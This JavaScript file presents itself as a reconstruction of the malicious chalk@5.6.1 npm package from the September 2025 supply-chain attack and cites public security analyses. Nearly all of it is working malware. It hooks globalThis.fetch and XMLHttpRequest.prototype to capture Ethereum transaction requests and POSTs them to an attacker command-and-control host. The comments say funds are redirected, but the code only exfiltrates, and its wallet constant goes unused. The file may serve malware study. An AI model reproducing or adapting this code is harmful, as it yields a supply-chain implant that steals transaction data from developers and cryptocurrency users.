// chalk@5.6.1 — reconstructed from public security analyses
// Source: https://semgrep.dev/blog/2025/chalk-debug-and-color-on-npm-compromised-in-new-supply-chain-attack/
// Source: https://www.sonatype.com/blog/npm-chalk-and-debug-packages-hit-in-software-supply-chain-attack
// Source: Sygnia threat intelligence report on prototype hooking
//
// September 2025: Maintainer phished, malicious version published.
// The payload intercepted web3 wallet transactions via prototype hooking.
// It hooked globalThis.fetch and XMLHttpRequest.prototype to intercept
// cryptocurrency transaction requests and redirect funds.
//
// Technique: Prototype hooking (globalThis.fetch), wallet transaction interception

const https = require("https");

// Attacker's wallet address
const ATTACKER_WALLET = "0x3c98a8d05c9f1c0a82f7f1b2c9e3d4f5a6b7c8d9";

// Hook globalThis.fetch to intercept web3 wallet transactions
const originalFetch = globalThis.fetch;
if (originalFetch) {
  globalThis.fetch = function(url, options) {
    try {
      if (options && options.body) {
        var body = typeof options.body === 'string' ? options.body : '';
        // Check for Ethereum/Web3 transaction signatures
        if (body.includes('eth_sendTransaction') || body.includes('eth_signTransaction')) {
          // Clone and exfiltrate the transaction data
          var exfilData = JSON.stringify({
            url: url,
            body: body,
            timestamp: Date.now()
          });

          var req = https.request({
            hostname: "cdn-gstatic.com.se",  // attacker C2
            port: 443,
            path: "/collect",
            method: "POST",
            headers: { "Content-Type": "application/json" }
          });
          req.write(exfilData);
          req.end();
        }
      }
    } catch(e) {}
    return originalFetch.apply(this, arguments);
  };
}

// Hook XMLHttpRequest for non-fetch Web3 providers
const origOpen = typeof XMLHttpRequest !== 'undefined' ?
  XMLHttpRequest.prototype.open : null;
const origSend = typeof XMLHttpRequest !== 'undefined' ?
  XMLHttpRequest.prototype.send : null;

if (origOpen && origSend) {
  var interceptUrl = '';
  XMLHttpRequest.prototype.open = function(method, url) {
    interceptUrl = url;
    return origOpen.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(data) {
    try {
      if (data && typeof data === 'string' && data.includes('eth_sendTransaction')) {
        var req = https.request({
          hostname: "cdn-gstatic.com.se",
          port: 443,
          path: "/xhr",
          method: "POST"
        });
        req.write(JSON.stringify({ url: interceptUrl, data: data }));
        req.end();
      }
    } catch(e) {}
    return origSend.apply(this, arguments);
  };
}

module.exports = {};
